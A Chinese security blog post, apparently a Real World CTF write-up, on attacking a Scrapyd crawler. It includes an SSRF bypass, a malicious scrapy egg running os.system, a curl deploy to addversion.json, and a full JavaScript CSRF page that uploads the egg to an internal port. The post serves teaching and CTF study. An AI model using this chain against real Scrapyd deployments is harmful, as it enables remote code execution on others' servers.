

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>攻击Scrapyd爬虫 | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                网络安全 &raquo; <a href="attack-scrapy.html">攻击Scrapyd爬虫</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">攻击Scrapyd爬虫</h1>
            <div class="details-up">
  <span class="author">作者: phithon</span>
  
  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
  
  <span class="date">时间: 2019-9-18 11:49</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">6条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="attack-scrapy.html">50110人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/scrapy.html">scrapy</a>
    
        <a href="../tag/%E7%88%AC%E8%99%AB.html">爬虫</a>
    
  </span>
  
</div>
            <div class="entry">
                <p>类似我一贯的做法，这次Real World CTF我出了一道实战性的题目，目标仍然是getshell。</p>
<p>我们以渗透测试的步骤来审视这道题目。</p>
<h2 id="0x01"><a class="toclink" href="#0x01">0x01 信息搜集</a></h2>
<p>与我以往的题目不同的是，这次虽然我自己写了一部分代码，但是这部分代码的目的是串联起几个服务，整个流程与代码漏洞无关，所以没有给出源代码。</p>
<p>目标是一个简单的web，描述是“Use crawlbox to get all links from a page”，输入一个URL，稍等片刻可以获取这个页面里所有的链接，后端应该是一个爬虫：</p>
<p><a href="../media/attachment/2019/09/18/41cb43ac-f5df-472b-9f6b-dc242848c2ec.png"><img alt="image.png" src="../media/attachment/2019/09/18/41cb43ac-f5df-472b-9f6b-dc242848c2ec.2ddb133f295a.png" /></a></p>
<p>我们抓取一下这个“爬虫”的请求：</p>
<p><a href="../media/attachment/2019/09/18/98581daa-ea12-42c3-b6dc-d869db07960b.png"><img alt="image.png" src="../media/attachment/2019/09/18/98581daa-ea12-42c3-b6dc-d869db07960b.80f157fe2db5.png" /></a></p>
<p>可见其User-Agent是<code>Scrapy/ChromeHeadless (+https://scrapy.org)</code>。从其中获取到了两个信息：</p>
<ul>
<li>Scrapy</li>
<li>Chrome Headless</li>
</ul>
<p>scrapy是python下的一款非常流行的爬虫框架，猜测用户输入的URL被交给scrapy执行，而scrapy中使用了Chrome对URL进行访问并获取结果。</p>
<p>关注到这一点，我们可以浏览一下scrapy这个工具的首页：</p>
<p><a href="../media/attachment/2019/09/18/1a0a42f2-e555-47c7-9ebd-ecc762347fee.png"><img alt="image.png" src="../media/attachment/2019/09/18/1a0a42f2-e555-47c7-9ebd-ecc762347fee.57583cb38622.png" /></a></p>
<p>其中提到部署爬虫可以部署到scrapyd，在文档中也提到了这一点：<a href="https://docs.scrapy.org/en/latest/topics/deploy.html">https://docs.scrapy.org/en/latest/topics/deploy.html</a>。</p>
<p>思考，作为一个Web服务，如果要调用scrapy爬虫爬取信息，无非有两种方法：</p>
<ul>
<li>直接命令行调用scrapy</li>
<li>通过scrapyd提供的API进行调用</li>
</ul>
<p>那么，如何分辨目标使用了哪种方法调用scrapy呢？</p>
<p>方法也很容易想到：我们可以尝试探测本地或内网中是否有开启scrapyd服务的端口。打开scrapyd的文档（<a href="https://scrapyd.readthedocs.io/en/latest/overview.html#webui">https://scrapyd.readthedocs.io/en/latest/overview.html#webui</a>），可知scrapyd默认开放在6800端口。</p>
<p>最简单的方法，我们直接用目标提供的爬虫功能进行探测（需要用<code>xip.io</code>简单绕过一下SSRF的检测）：</p>
<p><a href="../media/attachment/2019/09/18/2a2511c1-7ece-4c52-804b-5bb73db02585.png"><img alt="image.png" src="../media/attachment/2019/09/18/2a2511c1-7ece-4c52-804b-5bb73db02585.45d57219f06e.png" /></a></p>
<p>显然，本地6800端口是开启的，可以确定后端是scrapyd。</p>
<blockquote>
<p>如果你完全没注意到User-Agent中的scrapy，题干中的“I wrote a secure crawler on top of a browser, which you can use to crawl all the links on a website”也提到了浏览器，你也可以完全将这里理解为一个XSS盲打漏洞。</p>
<p>于是，我们可以利用XSS中的一些技巧，如：获取内网地址、对内网服务进行扫描、获取User-Agent、Cookie、LocalStorage等信息，进而也能获取到User-Agent中的scrapy，或者发现6800端口这样的敏感服务。</p>
<p>如果你阅读文档或者扫描到了6023端口，这也是曾经一个可以攻击scrapy的端口。scrapy在启动扫描期间会开放6023端口作为Telnet Console，通过这个端口可以直接执行任意Python代码。在1.5.2后，scrapy官方修复了这个问题，详见<a href="https://docs.scrapy.org/en/latest/news.html#scrapy-1-5-2-2019-01-22">https://docs.scrapy.org/en/latest/news.html#scrapy-1-5-2-2019-01-22</a>。</p>
</blockquote>
<h2 id="0x02-scrapyd"><a class="toclink" href="#0x02-scrapyd">0x02 如何攻击scrapyd</a></h2>
<p>一顿信息搜集后，目标整个工作流程就清晰了：用户输入的URL被交给部署在scrapyd上的爬虫进行爬取，爬虫调用了Chrome渲染页面，并将结果中的链接返回给用户。</p>
<p>那么，这里重点就是scrapyd了。我们需要阅读scrapyd的文档，方便理解这个项目的工作流程。通过文档可知，scrapy是一个爬虫框架，而scrapyd是一个云服务，用户可以将自己用scrapy框架开发的爬虫上传到云端，然后通过Web API调用这个爬虫爬取信息。</p>
<p>scrapyd主要提供以下一些API：</p>
<ul>
<li>/daemonstatus.json 获取云服务的状态</li>
<li>/addversion.json 上传一个新的爬虫项目，或者给一个已有的项目更新代码</li>
<li>/schedule.json 执行一个爬取任务</li>
<li>/cancel.json 停止并取消一个任务</li>
<li>/listprojects.json 列出云端的所有项目</li>
<li>/listversions.json 列出某个项目的所有代码版本</li>
<li>/listspiders.json 列出一个项目下所有spider，spider这个概念是scrapy框架中的，一个scrapy开发的爬虫可以有多个spider</li>
<li>/listjobs.json 列出所有任务，包括正在进行的、已完成的、等待执行的三个状态</li>
<li>/delversion.json 删除某个项目下的某个代码版本</li>
<li>/delversion.json 删除某个项目</li>
</ul>
<p>简单来说，scrapyd云服务下可以有多个项目，每个项目下可以有多个代码版本，每个代码版本就是一个完整的scrapy项目，一个scrapy项目下可以有多个spider，最终执行的任务的载体是一个spider。</p>
<p>那么，也就是说，攻击者可以创建一个项目，并部署他自己的scrapy代码版本，将恶意代码部署到云端，进而对scrapyd云端进行攻击。</p>
<p>根据这个思路，我们先在本地进行测试。</p>
<p>安装并启动scrapyd：</p>
<div class="codehilite"><pre><span></span><span class="n">pip</span> <span class="n">install</span> <span class="n">scrapyd</span>
<span class="n">scrapyd</span>
</pre></div>


<p>启动后访问<code>http://127.0.0.1:6800</code>即可看到主页：</p>
<p><a href="../media/attachment/2019/09/18/419f042d-1ada-47d9-adec-d40fec42a3be.png"><img alt="image.png" src="../media/attachment/2019/09/18/419f042d-1ada-47d9-adec-d40fec42a3be.1c9e8dd2cb3d.png" /></a></p>
<p>此时云端没有项目：</p>
<p><a href="../media/attachment/2019/09/18/ffc483fa-436c-490c-84aa-def86a358dc2.png"><img alt="image.png" src="../media/attachment/2019/09/18/ffc483fa-436c-490c-84aa-def86a358dc2.58fb3140d212.png" /></a></p>
<p>然后，我们本地再安装scrapy框架，并创建一个scrapy项目：</p>
<div class="codehilite"><pre><span></span>pip install scrapy
scrapy startproject evil
</pre></div>


<p>生成了项目后，我们在<code>evil/__init__.py</code>中加入恶意代码：</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>

<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;touch success&#39;</span><span class="p">)</span>
</pre></div>


<p>然后，我们用<a href="https://github.com/scrapy/scrapyd-client">scrapyd-client</a>这个工具，将项目打包成egg包。当然也可以自己用setuptools手工打包。</p>
<div class="codehilite"><pre><span></span>pip install scrapyd-client
scrapyd-deploy --build-egg<span class="o">=</span>evil.egg
</pre></div>


<p>此时，恶意的egg包已经生成，然后我们将其部署到云端：</p>
<div class="codehilite"><pre><span></span><span class="n">curl</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">6800</span><span class="o">/</span><span class="n">addversion</span><span class="p">.</span><span class="n">json</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="n">project</span><span class="o">=</span><span class="n">evil</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="n">r01</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="n">egg</span><span class="o">=</span><span class="nv">@evil</span><span class="p">.</span><span class="n">egg</span><span class="w"></span>
</pre></div>


<p>成功部署：</p>
<p><a href="../media/attachment/2019/09/18/c38e74ca-dc96-4e4c-923e-09209c0bd7f9.png"><img alt="image.png" src="../media/attachment/2019/09/18/c38e74ca-dc96-4e4c-923e-09209c0bd7f9.8bfe1d00e05f.png" /></a></p>
<p>此时，<code>touch success</code>已成功执行：</p>
<p><a href="../media/attachment/2019/09/18/fb6c6005-c88d-4e57-b008-123c344f3072.png"><img alt="image.png" src="../media/attachment/2019/09/18/fb6c6005-c88d-4e57-b008-123c344f3072.983570236ca8.png" /></a></p>
<h2 id="0x03-csrf"><a class="toclink" href="#0x03-csrf">0x03 利用CSRF漏洞攻击浏览器爬虫</a></h2>
<p>针对6800端口的攻击在本地可以复现了，但是目标网站的6800是开启在内网的，我们无法直接访问。</p>
<p>可以借助目标前端的那个SSRF吗？不行，因为这只是一个GET型的URL请求，无法发送POST包部署代码。</p>
<p>不过，因为这个URL是被浏览器执行的，而scrapyd的所有API接口实际上都是可以进行CSRF攻击的，所以我们可以利用页面中的JavaScript发送POST数据包给6800端口，进而调用那些非GET型的API。</p>
<p>构造一个向<code>http://127.0.0.1:6800/addversion.json</code>发送POST上传请求的页面：</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;content-type&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span> <span class="p">/&gt;</span>

  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>upload csrf<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>

<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
  <span class="kd">function</span> <span class="nx">b64toBlob</span><span class="p">(</span><span class="nx">b64Data</span><span class="p">,</span> <span class="nx">contentType</span><span class="p">,</span> <span class="nx">sliceSize</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">contentType</span> <span class="o">=</span> <span class="nx">contentType</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="nx">sliceSize</span> <span class="o">=</span> <span class="nx">sliceSize</span> <span class="o">||</span> <span class="mi">512</span><span class="p">;</span>

        <span class="kd">var</span> <span class="nx">byteCharacters</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="nx">b64Data</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">byteArrays</span> <span class="o">=</span> <span class="p">[];</span>

        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">offset</span> <span class="o">&lt;</span> <span class="nx">byteCharacters</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">offset</span> <span class="o">+=</span> <span class="nx">sliceSize</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">slice</span> <span class="o">=</span> <span class="nx">byteCharacters</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">offset</span><span class="p">,</span> <span class="nx">offset</span> <span class="o">+</span> <span class="nx">sliceSize</span><span class="p">);</span>

            <span class="kd">var</span> <span class="nx">byteNumbers</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">slice</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">slice</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">byteNumbers</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">slice</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="kd">var</span> <span class="nx">byteArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">byteNumbers</span><span class="p">);</span>

            <span class="nx">byteArrays</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">byteArray</span><span class="p">);</span>
        <span class="p">}</span>

      <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">(</span><span class="nx">byteArrays</span><span class="p">,</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="nx">contentType</span><span class="p">});</span>
      <span class="k">return</span> <span class="nx">blob</span><span class="p">;</span>
<span class="p">}</span>

    <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="nx">b64toBlob</span><span class="p">(</span><span class="s2">&quot;base64 data of evil.egg...&quot;</span><span class="p">,</span> <span class="s1">&#39;application/octet-stream&#39;</span><span class="p">)</span>

    <span class="kd">var</span> <span class="nx">myFormData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>
    <span class="nx">myFormData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">&quot;egg&quot;</span><span class="p">,</span> <span class="nx">blob</span><span class="p">,</span> <span class="s2">&quot;evil.egg&quot;</span><span class="p">);</span>
    <span class="nx">myFormData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">&quot;project&quot;</span><span class="p">,</span> <span class="s2">&quot;evil_project_01&quot;</span><span class="p">)</span>
    <span class="nx">myFormData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">&quot;version&quot;</span><span class="p">,</span> <span class="s2">&quot;r01&quot;</span><span class="p">)</span>
    <span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;http://127.0.0.1:6800/addversion.json&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">method</span><span class="o">:</span> <span class="s2">&quot;post&quot;</span><span class="p">,</span>
        <span class="nx">body</span><span class="o">:</span> <span class="nx">myFormData</span>
    <span class="p">})</span>
  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>


<p>值得注意的是，因为我们要上传一个二进制文件，所以我将evil.egg进行的base64编码：<code>cat evil.egg | base64</code>，然后将其转换成JavaScript中的Blob对象，添加到FormData中。</p>
<p>将这个页面提交给爬虫进行爬取，成功完成整个利用过程。</p>
<h2 id="0x04"><a class="toclink" href="#0x04">0x04 总结</a></h2>
<p>首先吐槽一下scrapy这个框架，真是盛名之下其实难副，虽然说到爬虫必然会说到这个框架，但实际上不管是从其生态、文档、代码等角度看待这个项目，都是无法和Python下另一个伟大的项目Django相提并论的。实际使用下来感觉其架构不合理，文档也模糊不清，周边生态如scrapyd、scrapyd-client更是陈旧不堪，问题很多，处于弃疗状态。</p>
<p>总的来说scrapy作为一个生态框架是不及格的，但聊胜于无吧，相比于手工编写爬虫来说还是给开发者提供了很多帮助。</p>
<p>另外，在MVVM架构日益流行的当下，爬虫也变得更加灵活，特别是借助Chrome Headless或splash的爬虫能够动态执行JavaScript这个特性，能让爬虫爬到的信息更加完善，但也让攻击者有更多攻击途径。</p>
<p>通常来说scrapy和splash是一对标配，虽然我这次用的是Chrome，事实上没啥太大差别。对于此类动态爬虫，攻击者可以对浏览器或js引擎本身进行攻击，或者如我这样利用JavaScript攻击内网里一些基础服务。</p>
<p>另外，经常会有人在运行爬虫的时候会设置<code>--no-sandbox</code>、<code>--disable-web-security</code>等危险选项，这也给攻击者提供了很多便利，我建议利用普通用户权限启动浏览器爬虫，以避免使用这些不安全的选项。</p>
<p>作为一个“黑客”，在开动自己扫描器的同时，也要注意这些问题了哦，不要踏进别人的蜜罐还被人反日了。</p>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/scrapy.html">scrapy</a>
                
                    <a href="../tag/%E7%88%AC%E8%99%AB.html">爬虫</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 6 条评论</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-3469">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/a98bd326a2fad2fb288f9415fe323430.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="https://scycoder.com" target="_blank" rel="nofollow noopener">黑色店铺</a></div>
                    <p>https://github.com/scrapy/scrapyd/pull/326<br><br>后来Scrapyd支持基础http认证了</p>
                    <span class="comment-time">时间: 2020-01-13 17:07</span>
                    <span class="comment-reply"><a href="#comment-3469" onclick="reply_to('3469','黑色店铺')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3424">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">redcon</a></div>
                    <p>go0st  不更新了吗？  最近在研究这个  萌新</p>
                    <span class="comment-time">时间: 2019-10-17 17:22</span>
                    <span class="comment-reply"><a href="#comment-3424" onclick="reply_to('3424','redcon')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3425">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@redcon 有点久了，不建议再研究这个。</p>
                    <span class="comment-time">时间: 2019-10-17 17:28</span>
                    <span class="comment-reply"><a href="#comment-3425" onclick="reply_to('3425','phithon')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3417">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="https://geeeez.github.io/" target="_blank" rel="nofollow noopener">geez</a></div>
                    <p>强还是P牛强啊！如何做到赚钱和学习兼顾呢？渗透测试中越来越多的重复性工作！P牛觉得未来安全哪个方向比较吃香呢？</p>
                    <span class="comment-time">时间: 2019-10-10 00:56</span>
                    <span class="comment-reply"><a href="#comment-3417" onclick="reply_to('3417','geez')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3418">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">菜鸡</a></div>
                    <p>@geez 自己写脚本替代重复性工作不就好了。</p>
                    <span class="comment-time">时间: 2019-10-12 14:19</span>
                    <span class="comment-reply"><a href="#comment-3418" onclick="reply_to('3418','菜鸡')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3419">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@geez 看好企业安全和安全开发。</p>
                    <span class="comment-time">时间: 2019-10-12 19:36</span>
                    <span class="comment-reply"><a href="#comment-3419" onclick="reply_to('3419','phithon')">回复</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="9c1fae3e4971ca77b6791156b83bdc7a53006749" />
</div><div class="col-6">
<img src="../captcha/image/9c1fae3e4971ca77b6791156b83bdc7a53006749/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="446" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="Kp7FaG7N1rPVQGisBiREYn7WDWS6sc1OwXvwILIwpN3Eoe6QDjOpVQa1Yj9h1Od6">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/sqlite3_exec.html">sqlite3_exec</a>
        
        <a rel="tag" href="../tag/%E5%AF%92%E5%81%87.html">寒假</a>
        
        <a rel="tag" href="../tag/2019.html">2019</a>
        
        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
        
        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E8%A1%8C.html">命令行</a>
        
        <a rel="tag" href="../tag/php.html">php</a>
        
        <a rel="tag" href="../tag/CRLF.html">CRLF</a>
        
        <a rel="tag" href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
        
        <a rel="tag" href="../tag/VS2010.html">VS2010</a>
        
        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
        
        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
        
        <a rel="tag" href="../tag/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html">原型链污染</a>
        
        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
        
